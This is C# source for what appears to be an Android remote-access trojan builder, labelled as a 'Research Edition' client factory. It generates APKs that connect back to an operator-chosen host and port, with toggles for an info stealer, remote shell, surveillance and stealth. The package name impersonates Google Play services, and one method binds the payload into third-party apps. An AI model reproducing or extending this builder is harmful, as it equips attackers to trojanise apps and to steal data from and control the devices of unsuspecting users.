using System;
using System.IO;
using System.Net;
using System.Net.Sockets;
using System.Threading.Tasks;
using System.Collections.Generic;
using System.Diagnostics;
using TcpServerApp.Models;
using TcpServerApp.Services.Elite;
using System.Text.Json;
using System.Linq;

namespace TcpServerApp.Services.Elite
{
    /// <summary>
    /// The Expert Factory for creating "Research Edition" Android Clients.
    /// Orchestrates the entire build pipeline: Source Gen -> Compile -> Inject -> Sign.
    /// </summary>
    public class ResearchClientFactory
    {
        private readonly ElitePayloadService _payloadService;
        private readonly KotlinPayloadGenerator _compiler;
        private readonly EliteDB _db;
        private readonly ActionConfigService _actionConfigService;
        private readonly LogService _logger;

        public ResearchClientFactory(LogService logger = null)
        {
            _payloadService = new ElitePayloadService();
            _compiler = new KotlinPayloadGenerator();
            _actionConfigService = new ActionConfigService();
            _db = new EliteDB();
            _logger = logger ?? new LogService(); // Fallback logger
        }

        public async Task<string> BuildClientAsync(string host, int port, string Key, string outputDir, bool privacy, bool bio, bool job, 
            TriggerMode trigger = TriggerMode.Immediate, int stealthLevel = 1, PostInstallMode installMode = PostInstallMode.None, 
            string iconPath = null, string targetUrl = null, bool enableWebView = false, List<string> extraPerms = null,
            bool enableNativeBridge = false,
            bool enableAI = false, bool enableProfiling = false, 
            bool enableStealer = false, bool enableShell = false, bool enableSurveillance = false,
            bool enableFrameworkHijack = true,
            bool enableSecureTelemetry = false, bool enableIntentAudit = false)
        {
            try
            {
                Log($"🚀 Starting Research Client Build for {host}:{port}:{Key}");
                Directory.CreateDirectory(outputDir);

                var config = new AdvancedPayloadConfig
                {
                    Host = host,
                    Port = port,
					Key = Key,
                    UseStealthMode = true,
                    EnableFederatedCompute = false, 
                    EnableJobScheduler = job,
                    EnableBioTwin = bio,
                    EnablePrivacyInspector = privacy,
                    Trigger = trigger,
                    StealthLevel = stealthLevel,
                    InstallBehavior = installMode,
                    CustomPackageName = "com.google.android.gms.research",
                    CustomServiceName = "ResearchService",
                    IconPath = iconPath,
                    TargetUrl = targetUrl,
                    EnableWebView = enableWebView,
                    ExtraPermissions = extraPerms ?? new List<string>(),
                    EnableAIRecompilation = enableAI,
                    EnableBehavioralProfiling = enableProfiling,
                    EnableInfoStealer = enableStealer,
                    EnableRemoteShell = enableShell,
                    EnableSurveillance = enableSurveillance,
                    EnableFrameworkInstrumentation = enableFrameworkHijack,
                    EnableSecureTelemetry = enableSecureTelemetry,
                    EnableIntentAudit = enableIntentAudit
                };

                // 0. Initialize Pipeline Config
                var pipelineData = new EliteGenerationResult
                {
                    PackageName = config.CustomPackageName,
                    ServiceName = config.CustomServiceName,
                    RequiredPermissions = config.ExtraPermissions ?? new List<string>(),
                    IconPath = config.IconPath,
                    ExtraManifestActivities = config.EnableWebView ? new List<string> { "<activity android:name=\".WebActivity\" />" } : new List<string>()
                };

                // AUTO-ENABLE NATIVE BRIDGE IF TOOLS AVAILABLE (Professional Default)
                // In a real academic project, we utilize maximum capabilities available.
                pipelineData.EnableNativeBridge = ToolLocator.IsAndroid36Available && !string.IsNullOrEmpty(ToolLocator.NdkClang);

                string dexPath;
                List<string> researchPermissions;
                Dictionary<string, string> extraReceivers = new Dictionary<string, string>();
                List<string> extraActivities = new List<string>();

                // --- TEMPLATE SYSTEM CHECK ---
                string templatePath = Path.Combine(AppDomain.CurrentDomain.BaseDirectory, "res", "templates", "ResearchCore");
                if (Directory.Exists(templatePath))
                {
                    Log("📂 Template 'ResearchCore' detected. Switching to Internal Template Build System.");
                    
                    // 1. Prepare
                    string tempDir = Path.Combine(Path.GetTempPath(), "ResearchTmpl_" + Guid.NewGuid().ToString().Substring(0,5));
                    Directory.CreateDirectory(tempDir);
                    
                    PrepareTemplate(templatePath, tempDir, config);
                    Log($"🔧 Template Configured in: {tempDir}");
                }

                // --- OMEGA APKOM v18.0 INTEGRATION (POWERSHELL BRIDGE) ---
                Log("🚀 DETECTED OMEGA BOREALIS TOOLCHAIN - ACTIVATING HIGH-FIDELITY ENGINE v18.0");
                
                string configFile = Path.Combine(AppDomain.CurrentDomain.BaseDirectory, "build_config.json");
                var buildConfig = new
                {
                    SelectedTemplate = config.CustomPackageName == "com.ekhtibar.payload" ? "Prime" : "GoogleResearch",
                    config.EnablePrivacyInspector,
                    config.EnableBioTwin,
                    EnableJobPersistence = config.EnableJobScheduler,
                    config.EnableSurveillance,
                    config.EnableInfoStealer,
                    config.EnableRemoteShell,
                    config.EnableAIRecompilation,
                    config.EnableBehavioralProfiling,
                    config.Host,
                    config.Port,
                    config.Key,
                    config.IconPath,
                    config.TargetUrl,
                    Trigger = config.Trigger.ToString(),
                    config.StealthLevel,
                    InstallMode = config.InstallBehavior.ToString(),
                    config.EnableWebView,
                    config.ExtraPermissions,
                    config.EnableFrameworkInstrumentation,
                    config.EnableSecureTelemetry,
                    config.EnableIntentAudit
                };
                
                File.WriteAllText(configFile, System.Text.Json.JsonSerializer.Serialize(buildConfig));
                Log("📝 Synchronized UI Features to build_config.json");

                string scriptPath = Path.Combine(AppDomain.CurrentDomain.BaseDirectory, "EliteBuildSystem.ps1");
                var psi = new ProcessStartInfo
                {
                    FileName = "powershell.exe",
                    Arguments = $"-ExecutionPolicy Bypass -File \"{scriptPath}\"",
                    WorkingDirectory = AppDomain.CurrentDomain.BaseDirectory,
                    UseShellExecute = false,
                    RedirectStandardOutput = true,
                    RedirectStandardError = true,
                    CreateNoWindow = true
                };

                using (var process = Process.Start(psi))
                {
                    if (process == null) throw new Exception("Failed to start PowerShell Build Engine.");
                    
                    while (!process.StandardOutput.EndOfStream)
                    {
                        var line = await process.StandardOutput.ReadLineAsync();
                        if (!string.IsNullOrEmpty(line)) Log($"[ENGINE] {line}");
                    }
                    await process.WaitForExitAsync();
                    
                    if (process.ExitCode != 0)
                    {
                        var err = await process.StandardError.ReadToEndAsync();
                        throw new Exception($"Build Engine Error (Exit {process.ExitCode}): {err}");
                    }
                }

                string finalApk = Path.Combine(AppDomain.CurrentDomain.BaseDirectory, "dist", "Borealis_v18_Integrated.apk");
                if (!File.Exists(finalApk)) throw new FileNotFoundException("Final APK not found after engine execution.");
                
                Log($"🎉 OMEGA APKOM v18.0 SUCCESS! Output: {finalApk}");
                return finalApk;
            }
            catch (Exception ex)
            {
                Log($"❌ Build Failed: {ex.Message}");
                throw;
            }
        }

        /// <summary>
        /// New Method: Advanced Binder (Injection into 3rd Party APK)
        /// </summary>
        public async Task<string> InjectIntoTargetAsync(string targetApk, string host, int port, string Key, string outputDir, 
            bool smaliHook = false, bool uiAuto = false, bool intentBroadcaster = false,
            bool secureTelemetry = false, bool intentAudit = false)
        {
            try
            {
                 Log($"🚀 Starting Advanced Injection for {Path.GetFileName(targetApk)}");
                 
                 // 1. Generate Payload DEX (Minimal Config)
                 var config = new AdvancedPayloadConfig 
                 { 
                     Host = host, Port = port, Key = Key,
                     CustomPackageName = "com.google.android.research", 
                     CustomServiceName = "ResearchService",
                     EnableSmaliHooking = smaliHook,
                     EnableUiAutomator = uiAuto,
                     EnableIntentBroadcaster = intentBroadcaster
                 };

                 string templatePath = Path.Combine(AppDomain.CurrentDomain.BaseDirectory, "res", "templates", "ResearchCore");
                 string tempDir = Path.Combine(Path.GetTempPath(), "ResearchBinder_" + Guid.NewGuid().ToString().Substring(0,5));
                 PrepareTemplate(templatePath, tempDir, config); // Reuses existing logic
                 
                 Log("⚙️ Compiling Payload...");
                 string dexPath = await _compiler.CompileFromDirectoryAsync(tempDir);
                 
                 // 1.5 Locate Native Libs (if any)
                 // We look for 'lib' or 'src/main/jniLibs' in the tempDir
                 string nativeLibsVal = null;
                 string directLib = Path.Combine(tempDir, "lib");
                 string jniLib = Path.Combine(tempDir, "src", "main", "jniLibs");
                 
                 if (Directory.Exists(directLib)) nativeLibsVal = directLib;
                 else if (Directory.Exists(jniLib)) nativeLibsVal = jniLib;

                 // 2. Bind using BinderService
                 var binder = new BinderService(_logger);
                 string finalPath = await binder.BindApkAsync(targetApk, dexPath, outputDir, nativeLibsVal);
                 
                 Log($"🎉 Injection Success! {finalPath}");
                 return finalPath;
            }
            catch(Exception ex)
            {
                Log($"❌ Injection Failed: {ex.Message}");
                throw;
            }
        }

        public event EventHandler<string>? OnLog;

        private void PrepareTemplate(string srcDir, string destDir, AdvancedPayloadConfig config)
        {
            // Recursive Copy
            foreach (string dirPath in Directory.GetDirectories(srcDir, "*", SearchOption.AllDirectories))
            {
                Directory.CreateDirectory(dirPath.Replace(srcDir, destDir));
            }

            foreach (string newPath in Directory.GetFiles(srcDir, "*.*", SearchOption.AllDirectories))
            {
                string targetPath = newPath.Replace(srcDir, destDir);
                File.Copy(newPath, targetPath, true);
                
                // Inject Config into Config.kt
                if (Path.GetFileName(targetPath) == "Config.kt")
                {
                    string content = File.ReadAllText(targetPath);
                    content = content.Replace("%LHOST%", config.Host)
                                     .Replace("%LPORT%", config.Port.ToString())
                                     .Replace("%LKEY%", config.Key)
                                     .Replace("%ENABLE_PRIVACY_INSPECTOR%", config.EnablePrivacyInspector.ToString().ToLower())
                                     .Replace("%ENABLE_BIO_TWIN%", config.EnableBioTwin.ToString().ToLower())
                                     .Replace("%ENABLE_SECURE_TELEMETRY%", config.EnableSecureTelemetry.ToString().ToLower())
                                     .Replace("%ENABLE_INTENT_AUDIT%", config.EnableIntentAudit.ToString().ToLower());
                    File.WriteAllText(targetPath, content);
                }
            }
        }
        
        // Helper to parse manifest (omitted for brevity as it is unchanged)
        private List<string> ParsePermissionsFromManifest(string manifestPath)
        {
            var perms = new List<string>();
            if (!File.Exists(manifestPath)) return perms;
            
            try 
            {
                string content = File.ReadAllText(manifestPath);
                var regex = new System.Text.RegularExpressions.Regex("android:name=\"([^\"]+)\"");
                foreach (System.Text.RegularExpressions.Match match in regex.Matches(content))
                {
                    string p = match.Groups[1].Value;
                    if (p.StartsWith("android.permission.")) perms.Add(p);
                }
            } 
            catch { }
            return perms;
        }

        private void Log(string msg)
        {
            _logger?.Append($"[ResearchFactory] {msg}");
            System.Diagnostics.Debug.WriteLine($"[ResearchFactory] {msg}");
            OnLog?.Invoke(this, msg);
        }
    }
}
